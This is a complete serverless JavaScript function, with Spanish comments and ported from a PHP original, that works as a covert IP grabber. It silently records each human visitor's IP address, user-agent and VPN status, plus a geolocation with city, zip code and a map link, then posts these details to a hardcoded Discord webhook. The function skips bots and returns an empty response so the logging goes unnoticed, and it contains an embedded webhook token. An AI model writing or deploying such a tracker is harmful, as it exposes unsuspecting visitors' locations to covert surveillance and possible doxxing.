exports.handler = async (event, context) => {
  const ip = context.clientContext.ip;
  const browser = event.headers['user-agent'] || '';

  // Ignora bots, como en el PHP original
  if (/bot|Discord|robot|curl|spider|crawler|^$/i.test(browser)) {
    return { statusCode: 200, body: '' };
  }

  // Fecha y hora (ajusta la zona horaria si necesitas)
  const now = new Date();
  const date = now.toLocaleDateString('en-GB', { timeZone: 'Europe/Amsterdam' });
  const time = now.toLocaleTimeString('en-GB', { timeZone: 'Europe/Amsterdam', hour: '2-digit', minute: '2-digit', second: '2-digit' });

  // Obtiene detalles de IP (usando las mismas APIs que el PHP)
  const detailsRes = await fetch(`http://ip-api.com/json/${ip}`);
  const details = await detailsRes.json();

  const vpnRes = await fetch(`https://json.geoiplookup.io/${ip}`);
  const vpnConn = await vpnRes.json();
  const vpn = vpnConn.connection_type === 'Corporate' ? 'Yes' : 'No';

  const country = details.country || 'Unknown';
  const countryCode = details.countryCode || 'Unknown';
  const region = details.regionName || 'Unknown';
  const city = details.city || 'Unknown';
  const zip = details.zip || 'Unknown';
  const lat = details.lat || 0;
  const lon = details.lon || 0;
  const lowerCountryCode = countryCode.toLowerCase();
  const flag = `https://countryflagsapi.com/png/${lowerCountryCode}`;

  // URL del webhook (ya insertada)
  const webhook = 'https://discord.com/api/webhooks/1405746856541032570/Ej8JxmwaWAUzn_KWYnptxMUXy20vZe5VQIYC-7AvlzBunnKti9S3tGpkB0n8ExmLXUje';

  // Payload para Discord (igual al embed del PHP)
  const payload = {
    username: ip,
    avatar_url: flag,
    embeds: [{
      title: `Visitor From ${country}`,
      color: 39423,
      fields: [
        { name: 'IP', value: ip, inline: true },
        { name: 'VPN?', value: vpn, inline: true },
        { name: 'Useragent', value: browser },
        { name: 'Country/CountryCode', value: `${country}/${countryCode}`, inline: true },
        { name: 'Region | City | Zip', value: `[${region} | ${city} | ${zip}](https://www.google.com/maps/search/?api=1&query=${lat},${lon} 'Google Maps Location (+/- 750M Radius)')`, inline: true }
      ],
      footer: {
        text: `${date} ${time}`,
        icon_url: 'https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png'
      }
    }]
  };

  // Envía a Discord
  await fetch(webhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  // Respuesta vacía para no afectar la página
  return { statusCode: 200, body: '' };
};
